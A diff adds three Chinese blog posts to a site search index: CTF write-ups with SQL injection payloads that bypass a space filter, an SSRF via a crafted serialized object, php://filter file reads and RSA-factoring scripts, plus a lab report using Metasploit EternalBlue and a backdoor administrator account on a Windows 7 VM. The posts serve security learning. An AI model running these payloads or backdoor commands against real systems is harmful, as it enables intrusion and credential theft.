@@ -991,4 +991,177 @@ E#---
         <tag>00截断</tag>
       </tags>
   </entry>
+  <entry>
+    <title>fakebook</title>
+    <url>/2020/09/27/fakebook/</url>
+    <content><![CDATA[<h1 id="攻防世界-fakebook"><a href="#攻防世界-fakebook" class="headerlink" title="攻防世界-fakebook"></a>攻防世界-fakebook</h1><p>感觉挺有意思的一道题，所以记录一下吧</p>
+<a id="more"></a>
+
+<h2 id="0x01发现注入点"><a href="#0x01发现注入点" class="headerlink" title="0x01发现注入点"></a>0x01发现注入点</h2><p>进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方</p>
+<p><code>http://220.249.52.133:44224/view.php?no=1</code>参数no这里应该是一个数字型的注入点，测试一下。</p>
+<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>显示是正常的，但是</p>
+<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>网页报错，确定了就是数字型注入</p>
+<p>接下来继续注入的常规操作。</p>
+<p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>时页面显示正常，并提示了网站的根目录</p>
+<p><img src="/2020/09/27/fakebook/order.png" alt></p>
+<p>但是当 order by 5 # 时，网页报错，确定是四列。</p>
+<p><strong>爆表名</strong></p>
+<p>本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测</p>
+<p><img src="/2020/09/27/fakebook/waf.png" alt="waf"></p>
+<p>试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示</p>
+<p><strong>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31</strong> 提示存在反序列化，但是不知道怎么用继续爆表。</p>
+<p><img src="/2020/09/27/fakebook/%E5%9B%9E%E6%98%BE.png" alt></p>
+<p><code>?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4#</code></p>
+<p><code>?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#</code></p>
+<p>爆出一大堆列名。直接读取data的内容</p>
+<p><strong>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</strong></p>
+<p><code>?no=-2 union/**/select 1,(select data from users),3,4 #</code></p>
+<p>发现内容是注册时信息保存为序列化内容</p>
+<p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”sunzy”;s:3:”age”;i:22;s:4:”blog”;s:12:”22.github.io”;}</p>
+<p>到这里就不知道怎么办了。。。</p>
+<h2 id="0x02审计源码"><a href="#0x02审计源码" class="headerlink" title="0x02审计源码"></a>0x02审计源码</h2><p>扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径</p>
+<p><img src="/2020/09/27/fakebook/robots.png" alt></p>
+<p>源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span>   //<span class="title">user</span>信息类</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span> // 处理<span class="title">url</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line"></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    $output = curl_exec($ch);</span><br><span class="line">    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">    <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    curl_close($ch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。</p>
+<p><strong>思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。</strong></p>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">?no=-2%20union/**/select%201,2,3,'O:<span class="number">8</span>:<span class="string">"UserInfo"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">4</span>:<span class="string">"name"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"sunzy"</span>;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">i:</span><span class="number">22</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"blog"</span>;<span class="string">s:</span><span class="number">29</span>:<span class="string">"file:///var/www/html/flag.php"</span>;&#125;<span class="string">'%20#</span></span><br></pre></td></tr></table></figure>
+
+<p>查看源码，解base64。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
+        <tag>unserailize</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>cumtctf</title>
+    <url>/2020/09/27/cumtctf/</url>
+    <content><![CDATA[<h1 id="CUMTCTF-wp"><a href="#CUMTCTF-wp" class="headerlink" title="CUMTCTF-wp"></a>CUMTCTF-wp</h1><a id="more"></a>
+
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>提示GET一个1,那就 url+?1</p>
+<p><img src="/2020/09/27/cumtctf/w1.png" alt></p>
+<p>提示post一个2</p>
+<p>那就post一个</p>
+<p><strong>注意的是要2=任意字符才出现源码</strong></p>
+<p> <img src="/2020/09/27/cumtctf/w2.png" alt></p>
+<p>审计代码，这里应该是利用file_get_contents()的漏洞直接读网页源码，并且提示flag在flag.php,直接<code>php://filter/read=convert.base64-encode/resource=flag.php</code>，读取base64源码之后解码即可</p>
+<p><img src="/2020/09/27/cumtctf/w4.png" alt></p>
+<p>PD9waHANCgkkZmxhZz0iQ1VNVENURnsxNzkwNTViNC1lOGY1LTQyZDItYmZlNC0wMjdkMTVlOTQ2YjJ9Ijs=</p>
+<h3 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h3><p>首先判断是否存在注入<code>username=admin&amp;password=pw&#39;</code></p>
+<p>在后面加上单引号后出现报错提示，确认有注入点</p>
+<p>但是继续测试 <code>&#39;or 1=1 #</code>会出现</p>
+<p><img src="/2020/09/27/cumtctf/w2-1.png" alt></p>
+<p>判断存在黑名单过滤。</p>
+<p>接下来就是判断是将什么加入黑名单了，经过字典测试发现是<strong>空格</strong>，这里可以使用/**/绕过。</p>
+<p>先测试有多少列，<code>&#39;union/**/select/**/1,2,3,4,5,6,7#</code>  到第七的时候，页面报错。</p>
+<p>   <code>&#39;union/**/select/**/1,2,3,4,5,6,7,8#</code> 到第八的时候显示下图，说明一共八列，并且第四列出现回显。</p>
+<p><img src="/2020/09/27/cumtctf/w2-2.png" alt></p>
+<p><strong>爆表</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=pw'union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="keyword">group_concat</span>(TABLE_NAME),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.TABLES<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>TABLE_SCHEMA=<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>爆列名</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=pw'union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="keyword">group_concat</span>(COLUMN_NAME),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.COLUMNS<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>TABLE_NAME=<span class="string">'users'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><code>user_id,first_name,last_name,user,password,avatar,last_login,failed_login</code>列名很多，选择password</p>
+<p><strong>爆flag</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=pw'union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="keyword">group_concat</span>(<span class="keyword">password</span>),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/27/cumtctf/w2-3.png" alt></p>
+<h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="幼儿园的密码题"><a href="#幼儿园的密码题" class="headerlink" title="幼儿园的密码题"></a>幼儿园的密码题</h3><p>先转换为十进制后在线分解后直接上脚本</p>
+<p><a href="http://www.factordb.com/" target="_blank" rel="noopener">http://www.factordb.com/</a> 在线分解网址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ByteToHex</span><span class="params">(bins)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">"%02X"</span> % x <span class="keyword">for</span> x <span class="keyword">in</span> bins]).strip()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2s</span><span class="params">(num)</span>:</span></span><br><span class="line">  t = hex(num)[<span class="number">2</span>:<span class="number">-1</span>]  <span class="comment"># python</span></span><br><span class="line">  <span class="keyword">if</span> len(t) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">    t = <span class="string">'0'</span> + t</span><br><span class="line">  \<span class="comment">#print(t)</span></span><br><span class="line">  <span class="keyword">return</span>(binascii.a2b_hex(t).decode(<span class="string">'latin1'</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">  g, x, y = egcd(a, m)</span><br><span class="line">  <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'null'</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> x % m</span><br><span class="line">c = <span class="number">40448992051548719008529549070468060415257485938698092782029814901918646701101</span></span><br><span class="line">p = <span class="number">328413456989577256301798468872388310877</span></span><br><span class="line">q = <span class="number">324350545929838254331191385863847627003</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p * q</span><br><span class="line">d = modinv(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (m)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>数字转字符的脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2s</span><span class="params">(num)</span>:</span></span><br><span class="line">  t = hex(num)[<span class="number">2</span>:<span class="number">-1</span>]  <span class="comment"># python</span></span><br><span class="line">  <span class="keyword">if</span> len(t) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">    t = <span class="string">'0'</span> + t</span><br><span class="line">  \<span class="comment">#print(t)</span></span><br><span class="line">  <span class="keyword">return</span>(binascii.a2b_hex(t).decode(<span class="string">'latin1'</span>))</span><br><span class="line">print(n2s(a)) <span class="comment">#a为上一个脚本计算出的数字</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="小学生的密码题"><a href="#小学生的密码题" class="headerlink" title="小学生的密码题"></a>小学生的密码题</h3><h3 id="初中生的密码题"><a href="#初中生的密码题" class="headerlink" title="初中生的密码题"></a>初中生的密码题</h3><p>次题与幼儿园的类似，但是由于n过大，试了很多工具都无法分解。</p>
+<p>仔细看题会发现这题的条件给的比较多,知道p-q</p>
+<p>于是想到了<code>(p+q)^2-(p-q)^2=4pq=4n</code>，可以算出p+q,之后解出p,q</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">算p,q的脚本</span><br><span class="line"><span class="comment"># -*- coding = utf - 8 -*-</span></span><br><span class="line"><span class="comment">#@Time : 2020/9/24 21:55</span></span><br><span class="line"><span class="comment">#@Author : sunzy</span></span><br><span class="line"><span class="comment">#@File : su.py</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397</span></span><br><span class="line">p_sub_q = <span class="number">-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636</span></span><br><span class="line">x = (<span class="number">4</span>*n+p_sub_q*p_sub_q)</span><br><span class="line"></span><br><span class="line">gmpy2.mpz(x)</span><br><span class="line"><span class="comment">#p_add_q = gmpy2.iroot(x, 2)</span></span><br><span class="line">p_add_q = <span class="number">58342634998122692674032973234620896020471694068399847453520741898744437026570834277134765347908181270295928479896424327076716339778780713227054670754114006755614107059128760453507315091935855120450792252194791430498450216725579392051311373554303029775579999984765816108626868293630358812164765119470747267373609041885833415440716244492402495944064255436477147868576748300862501670473856373437423326957856588782039066794320093570665076624361151742737113922376038763268964187459938086360191752544167623804772397201519904950840301831333585995087985697059748872751988663760065650743406672809203915981347563824970092886078</span></span><br><span class="line"><span class="comment"># print(p_add_q)</span></span><br><span class="line">y=(p_sub_q+p_add_q)</span><br><span class="line">z=(p_add_q-p_sub_q)</span><br><span class="line"></span><br><span class="line">print(y&gt;&gt;<span class="number">1</span>)</span><br><span class="line">print(z&gt;&gt;<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>知道p,q后，此题的解法与幼儿园的解法相同</p>
+<p>菜鸡只会这么多。。。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
+        <tag>文件包含</tag>
+        <tag>rsa</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网安作业</title>
+    <url>/2020/09/27/homework/</url>
+    <content><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方</p>
+<p>将两台虚拟机桥接到同一网卡，并保证能够通信</p>
+<p>Kali IP 10.1.1.1  255.0.0.0  win7 IP　10.1.1.2  255.0.0.0</p>
+<p>测试两台主机之间的通信情况</p>
+<p><img src="/2020/09/27/homework/1.png" alt></p>
+<p><img src="/2020/09/27/homework/2.png" alt> </p>
+<p>使用msf前需要开启postgresql服务 </p>
+<p>开启服务：service postgresql start </p>
+<p>查看服务状态：service postgresql status</p>
+<p>开到绿色字体的active即为开启了</p>
+<p>初始化数据库：msfdb init </p>
+<p><img src="/2020/09/27/homework/3.png" alt> </p>
+<h2 id="2-攻击过程"><a href="#2-攻击过程" class="headerlink" title="2. 攻击过程"></a>2. 攻击过程</h2><h3 id="1-首先判断目标主机是否打开445端口"><a href="#1-首先判断目标主机是否打开445端口" class="headerlink" title="(1).首先判断目标主机是否打开445端口"></a>(1).首先判断目标主机是否打开445端口</h3><p>使用nmap+ip 扫描</p>
+<p><img src="/2020/09/27/homework/4.png" alt> </p>
+<h3 id="2-确认目标主机打开445端口后直接使用msf进行攻击"><a href="#2-确认目标主机打开445端口后直接使用msf进行攻击" class="headerlink" title="(2) .确认目标主机打开445端口后直接使用msf进行攻击"></a>(2) .确认目标主机打开445端口后直接使用msf进行攻击</h3><p>输入msfconsole　启动ｍｓｆ</p>
+<p>输入search　MS17-010</p>
+<p>找到exploit windows/smb/ms17_010_eternalblue,</p>
+<p>运行</p>
+<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> exploitwindows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure>
+
+<p>输入 show options  查看需要配置哪些信息</p>
+<p>RHOSTS 为目标主机IP(10.1.1.2)</p>
+<p>RPORT 为目标端口号(445)</p>
+<p>LHOST 为监听主机IP(10.1.1.1)</p>
+<p><img src="/2020/09/27/homework/5.png" alt> </p>
+<p><img src="/2020/09/27/homework/6.png" alt> </p>
+<h3 id="3-配置成功后设置tcp连接"><a href="#3-配置成功后设置tcp连接" class="headerlink" title="(3). 配置成功后设置tcp连接"></a>(3). 配置成功后设置tcp连接</h3><p>输入命令</p>
+<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> payload <span class="comment">windows</span>/x64/<span class="comment">meterpreter</span>/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-开始运行"><a href="#4-开始运行" class="headerlink" title="(4).开始运行"></a>(4).开始运行</h3><p>输入 exploit/run </p>
+<p>成功获取shell</p>
+<p> <img src="/2020/09/27/homework/8.png" alt></p>
+<p><img src="file:///C:%5CUsers%5CSunzh%5CAppData%5CLocal%5CTemp%5Cksohtml14056%5Cwps9.jpg" alt="img"> </p>
+<p>查看ip地址验证是否为目标主机。</p>
+<h3 id="5-设立后门，在目标主机中创建一个用户"><a href="#5-设立后门，在目标主机中创建一个用户" class="headerlink" title="(5)设立后门，在目标主机中创建一个用户"></a>(5)设立后门，在目标主机中创建一个用户</h3><p>创建一个用户</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">net<span class="built_in"> user </span>test abc123.com /add</span><br></pre></td></tr></table></figure>
+
+<p>Username:test </p>
+<p>password:abc123.com</p>
+<p><img src="/2020/09/27/homework/9.png" alt> </p>
+<p>将该用户加入管理员组，使其拥有管理员权限</p>
+<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">net localgroup administrtors test /<span class="keyword">add</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/27/homework/10.png" alt> </p>
+<p>目标主机上用户创建成功</p>
+<img src="/2020/09/27/homework/11.png" style="zoom:70%;">
+
+
+
+
+
+<p> <strong>实验结束</strong></p>
+]]></content>
+      <categories>
+        <category>网安作业</category>
+      </categories>
+      <tags>
+        <tag>msf</tag>
+      </tags>
+  </entry>
 </search>
